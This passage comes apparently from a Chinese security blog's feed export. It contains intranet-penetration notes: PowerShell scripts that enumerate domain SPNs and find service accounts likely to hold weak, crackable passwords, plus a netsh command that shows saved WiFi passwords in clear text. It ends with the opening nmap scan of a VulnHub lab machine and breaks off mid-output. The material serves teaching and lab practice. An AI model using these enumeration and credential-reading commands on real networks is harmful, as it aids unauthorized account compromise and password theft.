<p><code>PowerShellery</code>  下有各种各样针对服务 SPN 探测的脚本。其中一些需要 <code>PowerShell v2.0</code>  的环境，还有一些则需要 <code>PowerShell v3.0</code>  环境。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>#<span class="token class-name">Powershellery</span><span class="token operator">/</span><span class="token class-name">Stable</span><span class="token operator">-</span>ish<span class="token operator">/</span><span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token operator">/</span> 下<span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token punctuation">.</span>psm1脚本的使用<span class="token punctuation">,</span>需要powershell3<span class="token punctuation">.</span><span class="token number">0</span>及以上版本才能使用</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token punctuation">.</span>psm1</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span>SPN <span class="token operator">-</span>type service <span class="token operator">-</span>search <span class="token string">"*"</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span>SPN <span class="token operator">-</span>type service <span class="token operator">-</span>search <span class="token string">"*"</span> <span class="token operator">-</span><span class="token class-name">List</span> yes <span class="token operator">|</span> <span class="token class-name">Format</span><span class="token operator">-</span><span class="token class-name">Table</span></pre></td></tr><tr><td data-num="5"></td><td><pre>#<span class="token class-name">Powershellery</span><span class="token operator">/</span><span class="token class-name">Stable</span><span class="token operator">-</span>ish<span class="token operator">/</span>ADS<span class="token operator">/</span> 下<span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span><span class="token punctuation">.</span>psm1脚本的使用</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span><span class="token punctuation">.</span>psm1</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span><span class="token class-name">DomainSpn</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205627963-508257973.png" alt="image" /></p>
<h4 id="riskyspn中的find-potentiallycrackableaccountsps1"><a class="anchor" href="#riskyspn中的find-potentiallycrackableaccountsps1">#</a> RiskySPN 中的 Find-PotentiallyCrackableAccounts.ps1：</h4>
<p>该脚本可以帮助我们自动识别弱服务票据，主要作用是对属于用户的可用服务票据执行审计，并根据用户帐户和密码过期时限来查找最容易包含弱密码的票据。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vc3RlbW1tL1BMdG9vbHMvYmxvYi9tYWluL0ZpbmQtUG90ZW50aWFsbHlDcmFja2FibGVBY2NvdW50cy5wczE=">项目地址</span></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span><span class="token punctuation">.</span>ps1<span class="token punctuation">;</span><span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span> <span class="token operator">-</span><span class="token class-name">FullData</span> <span class="token operator">-</span><span class="token class-name">Verbose</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205650600-2009275168.png" alt="image" /></p>
<p>该脚本将提供比 klist 和 Mimikatz 更详细的输出，包括组信息，密码有效期和破解窗口。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205657811-1827696194.png" alt="image" /></p>
<p>使用 domain 参数，将返回所有具有关联服务主体名称的用户帐户，也就是将返回所有 SPN 注册在域用户下的用户。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span><span class="token punctuation">.</span>ps1<span class="token punctuation">;</span><span class="token class-name">Find</span><span class="token operator">-</span><span class="token class-name">PotentiallyCrackableAccounts</span> <span class="token operator">-</span><span class="token class-name">Domain</span> <span class="token string">"xie.com"</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205708529-1090185347.png" alt="image" /></p>
<h2 id="cmd命令查看wifi密码"><a class="anchor" href="#cmd命令查看wifi密码">#</a> CMD 命令查看 WiFi 密码</h2>
<h3 id="cmd命令查看wifi密码-2"><a class="anchor" href="#cmd命令查看wifi密码-2">#</a> CMD 命令查看 WiFi 密码</h3>
<p>使用 CMD 命令查看 WiFi 密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>运行<span class="token constant">CMD</span>（命令提示符） （确保无线网卡启用状态）</pre></td></tr><tr><td data-num="2"></td><td><pre>输入命令查看WiFi配置文件：</pre></td></tr></table></figure><p>使用命令：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># 列出所有连接过的WiFi的配置文件  </pre></td></tr><tr><td data-num="2"></td><td><pre>netsh wlan show profiles</pre></td></tr><tr><td data-num="3"></td><td><pre># 查看到某个具体WiFi的配置详情，包括密码：</pre></td></tr><tr><td data-num="4"></td><td><pre>netsh wlan show profiles name<span class="token operator">=</span><span class="token string">"XXXXXX"</span> key<span class="token operator">=</span>clear</pre></td></tr><tr><td data-num="5"></td><td><pre># <span class="token constant">XXXXXX</span> 代替自己的WiFi名称即可</pre></td></tr></table></figure><p>示例：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>netsh wlan show profiles name<span class="token operator">=</span><span class="token string">"21r000"</span> key<span class="token operator">=</span>clear</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205727861-452665486.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205736926-1649647880.png" alt="image" /></p>
<p>即可看到 WiFi 密码。</p>
<h3 id="图形界面查看wifi密码"><a class="anchor" href="#图形界面查看wifi密码">#</a> 图形界面查看 WiFi 密码</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205808942-1338487961.png" alt="image" /></p>
<p>双击后点击 “无限属性” 进入 “安全” 目录显示字符即可查看 WiFi 密码。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205814658-555281974.png" alt="image" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>emmmmm，杰哥不要啊！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211129205825191-1202434293.jpg" alt="image" /></p>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTEYxMGtEdUlrMmw4R3d1LUNhazhLQQ==">内网渗透（一） | 域渗透之 SPN 服务主体名称</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3OTE2MTgzL2FydGljbGUvZGV0YWlscy8xMDA4NTk2MzU=">CMD 命令查看 WiFi 密码</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-School</title>
    <url>/article/50ab0d7.html</url>
    <content><![CDATA[<p>扫描本地靶机：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan <span class="token operator">-</span>l</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011213504514-437094754.png" alt="" /></p>
<p>结合 ifconfig 查询本机 ip：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011222207385-404436622.png" alt="" /></p>
<p>可以确定靶机 IP 为：192.168.56.117</p>
<p>扫描靶机端口</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# nmap <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">09</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">05</span> <span class="token constant">EDT</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">mass_dns</span><span class="token operator">:</span> warning<span class="token operator">:</span> Unable to determine any <span class="token constant">DNS</span> servers<span class="token punctuation">.</span> Reverse <span class="token constant">DNS</span> is disabled<span class="token punctuation">.</span> Try using <span class="token operator">--</span>system<span class="token operator">-</span>dns or specify valid servers <span class="token keyword">with</span> <span class="token operator">--</span>dns<span class="token operator">-</span>servers</pre></td></tr><tr><td data-num="6"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="7"></td><td><pre>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">.</span>00053s latency<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="8"></td><td><pre>Not shown<span class="token operator">:</span> <span class="token number">65532</span> closed ports</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">PORT</span>   <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">22</span><span class="token operator">/</span>tcp open  ssh     OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span><span class="token function">deb10u2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>   <span class="token number">2048</span> <span class="token literal-property property">de</span><span class="token operator">:</span>b5<span class="token operator">:</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">89</span><span class="token operator">:</span>bb<span class="token operator">:</span>9f<span class="token operator">:</span>d4<span class="token operator">:</span>1a<span class="token operator">:</span>b5<span class="token operator">:</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">53</span><span class="token operator">:</span>d0<span class="token operator">:</span>b7<span class="token operator">:</span>5c<span class="token operator">:</span>b0<span class="token operator">:</span><span class="token number">3</span><span class="token function">f</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span>ea<span class="token operator">:</span>b9<span class="token operator">:</span>fa<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span>e9<span class="token operator">:</span><span class="token number">45</span><span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span>5e<span class="token operator">:</span>3b<span class="token operator">:</span>b4<span class="token operator">:</span>fd<span class="token operator">:</span><span class="token number">11</span><span class="token operator">:</span><span class="token number">0</span><span class="token function">a</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> 9f<span class="token operator">:</span><span class="token number">66</span><span class="token operator">:</span>5e<span class="token operator">:</span><span class="token number">71</span><span class="token operator">:</span>b9<span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span>5d<span class="token operator">:</span>ed<span class="token operator">:</span><span class="token number">70</span><span class="token operator">:</span>5a<span class="token operator">:</span>4f<span class="token operator">:</span>5a<span class="token operator">:</span>8d<span class="token operator">:</span>0d<span class="token operator">:</span><span class="token number">65</span><span class="token operator">:</span><span class="token function">d5</span> <span class="token punctuation">(</span><span class="token constant">ED25519</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">23</span><span class="token operator">/</span>tcp open  telnet<span class="token operator">?</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span> fingerprint<span class="token operator">-</span>strings<span class="token operator">:</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span>   DNSStatusRequestTCP<span class="token punctuation">,</span> DNSVersionBindReqTCP<span class="token punctuation">,</span> FourOhFourRequest<span class="token punctuation">,</span> GenericLines<span class="token punctuation">,</span> GetRequest<span class="token punctuation">,</span> HTTPOptions<span class="token punctuation">,</span> Help<span class="token punctuation">,</span> JavaRMI<span class="token punctuation">,</span> Kerberos<span class="token punctuation">,</span> LANDesk<span class="token operator">-</span><span class="token constant">RC</span><span class="token punctuation">,</span> LDAPBindReq<span class="token punctuation">,</span> LDAPSearchReq<span class="token punctuation">,</span> LPDString<span class="token punctuation">,</span> <span class="token constant">NCP</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> NotesRPC<span class="token punctuation">,</span> RPCCheck<span class="token punctuation">,</span> RTSPRequest<span class="token punctuation">,</span> SIPOptions<span class="token punctuation">,</span> SMBProgNeg<span class="token punctuation">,</span> SSLSessionReq<span class="token punctuation">,</span> TLSSessionReq<span class="token punctuation">,</span> TerminalServer<span class="token punctuation">,</span> TerminalServerCookie<span class="token punctuation">,</span> WMSRequest<span class="token punctuation">,</span> X11Probe<span class="token punctuation">,</span> afp<span class="token punctuation">,</span> ms<span class="token operator">-</span>sql<span class="token operator">-</span>s<span class="token punctuation">,</span> oracle<span class="token operator">-</span>tns<span class="token punctuation">,</span> <span class="token literal-property property">tn3270</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>_    Verification Code<span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">80</span><span class="token operator">/</span>tcp open  http    Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">|</span> http<span class="token operator">-</span>title<span class="token operator">:</span> <span class="token number">404</span> Not Found</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span>_Requested resource was login<span class="token punctuation">.</span>php</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">1</span> service unrecognized despite returning data<span class="token punctuation">.</span> If you know the service<span class="token operator">/</span>version<span class="token punctuation">,</span> please submit the following fingerprint at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>cgi<span class="token operator">-</span>bin<span class="token operator">/</span>submit<span class="token punctuation">.</span>cgi<span class="token operator">?</span><span class="token keyword">new</span><span class="token operator">-</span>service <span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token constant">SF</span><span class="token operator">-</span>Port23<span class="token operator">-</span><span class="token constant">TCP</span><span class="token operator">:</span><span class="token constant">V</span><span class="token operator">=</span><span class="token number">7.80</span><span class="token operator">%</span><span class="token constant">I</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">%</span><span class="token constant">D</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">9</span><span class="token operator">%</span>Time<span class="token operator">=</span>61614D38<span class="token operator">%</span><span class="token constant">P</span><span class="token operator">=</span>x86_64<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token constant">NULL</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>GenericLines<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>tn3270<span class="token punctuation">,</span>1C<span class="token punctuation">,</span>"Ver</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(GetRequest,1C,"</span>Verifi</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>cation\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(HTTPOptions,1C,"</span>Verifica</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>tion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(RTSPRequest,1C,"</span>Verificati</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>on\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(RPCCheck,1C,"</span>Verification\x2</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>0Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(DNSVersionBindReqTCP,1C,"</span>Verifica</pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>tion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(DNSStatusRequestTCP,1C,"</span>Ve</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>rification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(Help,1C,"</span>Verificatio</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SSLSessionReq,1C,"</span>Verificatio</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TerminalServerCookie,1C,"</span>Veri</pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>fication\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TLSSessionReq,1C,"</span>Veri</pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>fication\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(Kerberos,1C,"</span>Verificat</pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SMBProgNeg,1C,"</span>Verification</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(X11Probe,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(FourOhFourRequest,1C,"</span>Verification\</pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LPDString,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LDAPSearchReq,1C,"</span>Verification\x20C</pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ode<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LDAPBindReq,1C,"</span>Verification\x20Cod</pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>e<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(SIPOptions,1C,"</span>Verification\x20Code<span class="token operator">:</span>\</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(LANDesk-RC,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(TerminalServer,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\</pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(NCP,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\</pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(NotesRPC,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\</pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token number">0</span>\xe2\x1c<span class="token string">")%r(JavaRMI,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\</pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>x1c<span class="token string">")%r(WMSRequest,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c</pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token string">")%r(oracle-tns,1C,"</span>Verification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c"<span class="token punctuation">)</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token function">r</span><span class="token punctuation">(</span>ms<span class="token operator">-</span>sql<span class="token operator">-</span>s<span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>afp</pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token constant">MAC</span> <span class="token literal-property property">Address</span><span class="token operator">:</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token constant">F2</span><span class="token operator">:</span><span class="token constant">EC</span><span class="token operator">:</span><span class="token number">94</span> <span class="token punctuation">(</span>Oracle VirtualBox virtual <span class="token constant">NIC</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>No exact <span class="token constant">OS</span> matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what <span class="token constant">OS</span> is running on it<span class="token punctuation">,</span> see https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">IP</span> <span class="token literal-property property">fingerprint</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">SCAN</span><span class="token punctuation">(</span><span class="token constant">V</span><span class="token operator">=</span><span class="token number">7.80</span><span class="token operator">%</span><span class="token constant">E</span><span class="token operator">=</span><span class="token number">4</span><span class="token operator">%</span><span class="token constant">D</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">9</span><span class="token operator">%</span><span class="token constant">OT</span><span class="token operator">=</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">CT</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">CU</span><span class="token operator">=</span><span class="token number">37182</span><span class="token operator">%</span><span class="token constant">PV</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">DS</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">=</span><span class="token constant">D</span><span class="token operator">%</span><span class="token constant">G</span><span class="token operator">=</span><span class="token constant">Y</span><span class="token operator">%</span><span class="token constant">M</span><span class="token operator">=</span><span class="token number">080027</span><span class="token operator">%</span><span class="token constant">T</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token constant">OS</span><span class="token operator">:</span><span class="token constant">M</span><span class="token operator">=</span>61614D44<span class="token operator">%</span><span class="token constant">P</span><span class="token operator">=</span>x86_64<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">)</span><span class="token 